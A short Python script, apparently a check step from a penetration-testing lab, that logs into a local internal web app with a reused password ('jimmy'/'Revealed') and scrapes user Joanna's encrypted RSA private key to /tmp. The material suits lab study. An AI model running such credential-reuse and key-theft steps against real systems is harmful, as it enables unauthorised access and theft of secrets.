#!/usr/bin/env python3
import os
import re
import requests

s = requests.Session()
login = s.post("http://127.0.0.1:52846/index.php",
               data={"username": "jimmy", "password": "Revealed"},
               allow_redirects=True, timeout=8)
assert login.status_code == 200
page = s.get("http://127.0.0.1:52846/main.php", timeout=8)
assert page.status_code == 200 and "Don't forget your" in page.text
m = re.search(r"<pre>\s*(-----BEGIN RSA PRIVATE KEY-----.*?-----END RSA PRIVATE KEY-----)\s*</pre>", page.text, re.S)
assert m, "Internal page did not return Joanna's encrypted private key"
with open("/tmp/joanna_id_rsa", "w") as f:
    f.write(m.group(1) + "\n")
os.chmod("/tmp/joanna_id_rsa", 0o600)
print("PASS: Jimmy reused DB password -> internal port 52846 -> Revealed SHA-512 login -> Joanna encrypted RSA key")
